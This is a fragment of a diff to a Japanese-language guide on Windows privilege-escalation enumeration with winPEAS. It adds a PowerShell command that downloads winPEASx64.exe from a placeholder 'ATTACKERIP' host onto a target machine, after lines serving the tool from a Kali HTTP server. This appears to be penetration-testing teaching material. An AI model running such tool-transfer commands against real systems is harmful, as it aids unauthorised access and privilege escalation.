@@ -223,6 +223,8 @@ Windows 環境における権限昇格の可能性を自動で調査するため
 cd /usr/share/peass/winpeas
 python3 -m http.server 80  # Kali側
 # Windows側で certutil または powershell wget で取得
+powershell -Command "Invoke-WebRequest -Uri http://ATTACKERIP/winPEASx64.exe -OutFile C:\Users\ユーザー名\winpeas.exe"
+
 ```
 #### 2. 実行（PowerShellまたはcmd）
 ```
